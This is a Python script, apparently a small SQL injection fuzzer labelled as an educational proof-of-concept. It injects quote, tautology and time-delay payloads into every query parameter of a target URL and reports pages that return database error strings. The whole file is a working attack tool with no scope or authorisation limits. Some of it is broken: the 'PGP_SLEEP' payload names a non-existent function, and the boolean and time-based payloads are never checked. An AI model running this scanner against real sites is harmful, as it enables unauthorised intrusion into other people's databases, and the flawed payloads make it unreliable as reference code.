import requests
import sys
import argparse
import json
import urllib.parse

# --- L0p4 SQLi Fuzzer (Real) ---
# A basic proof-of-concept fuzzer for educational testing.

PARAMS = {
    'error_based': ["'", "\"", "'--", "' OR 1=1 --", '" OR "1"="1'],
    'boolean_based': ["' AND 1=1 --", "' AND 1=0 --"],
    'time_based': ["' WAITFOR DELAY '0:0:5' --", "'; SELECT PGP_SLEEP(5)--"]
}

SQL_ERRORS = [
    "SQL syntax",
    "mysql_fetch_array",
    "ORA-01756",
    "Microsoft OLE DB Provider for SQL Server",
    "Unclosed quotation mark"
]

def scan(url, payload_type='error_based'):
    vulnerabilities = []
    print(f"[*] Scanning {url} for {payload_type} SQLi...")
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print("[-] No parameters to fuzz.")
        return {"vulnerabilities": []}

    for param, values in params.items():
        original_value = values[0]
        
        for payload in PARAMS.get(payload_type, []):
            # Construct malicious URL
            fuzzed_params = params.copy()
            fuzzed_params[param] = [original_value + payload]
            query_string = urllib.parse.urlencode(fuzzed_params, doseq=True)
            target_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment)
            )
            
            try:
                # Send Request
                r = requests.get(target_url, timeout=5)
                
                # Check for Error Vulnerability
                if payload_type == 'error_based':
                    for error in SQL_ERRORS:
                        if error in r.text:
                            vuln = {
                                "type": "Error-Based SQLi",
                                "parameter": param,
                                "payload": payload,
                                "indicator": error,
                                "url": target_url
                            }
                            vulnerabilities.append(vuln)
                            print(f"[!] VULNERABLE: {param} -> {payload}")
                            break
                            
            except Exception as e:
                pass

    return {"vulnerabilities": vulnerabilities}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Real SQLi Fuzzer")
    parser.add_argument("url", help="Target URL")
    args = parser.parse_args()
    
    results = scan(args.url)
    print(json.dumps(results, indent=2))
